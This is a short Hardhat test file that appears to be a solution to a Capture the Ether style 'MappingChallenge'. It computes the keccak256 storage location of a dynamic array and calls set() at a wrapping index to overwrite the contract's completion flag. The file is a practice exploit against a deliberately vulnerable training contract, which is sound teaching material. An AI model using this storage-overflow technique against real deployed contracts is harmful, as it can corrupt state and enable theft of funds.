const { expect } = require("chai");
const { ethers } = require("hardhat");
const keccak256 = require('keccak256');

describe("MappingChallenge", async function () {
    let contract;

    const MAX_UINT256 = ethers.BigNumber.from(2).pow(256).sub(1);

    before(async function () {
        contract = await (await ethers.getContractFactory("MappingChallenge")).deploy();
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        const lengthSlot = Buffer.from(Array(31).fill(0).concat([1]));

        const startingSlotHash = keccak256(lengthSlot);
        const startingSlotHex = "0x".concat(startingSlotHash.toString("hex"));
        const startingSlotNumber = ethers.BigNumber.from(startingSlotHex);

        await contract.set(MAX_UINT256.sub(startingSlotNumber).add(1), 1);
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});